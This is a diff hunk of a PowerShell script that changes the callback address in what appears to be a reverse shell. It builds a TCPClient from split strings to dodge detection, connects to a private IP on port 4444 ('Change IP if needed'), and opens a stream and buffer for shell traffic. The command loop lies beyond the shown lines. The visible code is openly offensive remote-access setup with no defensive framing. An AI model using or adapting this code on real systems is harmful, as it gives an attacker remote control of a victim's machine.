@@ -1,6 +1,6 @@
 $a = "System.Net.Sockets."
 $b = "TCPClient"
-$c = New-Object ($a + $b)("172.16.176.63", 4444) # Change IP if needed
+$c = New-Object ($a + $b)("10.205.199.168", 4444) # Change IP if needed
 $s = $c.GetStream()
 
 [byte[]]$b_arr = 0..65535|%{0}
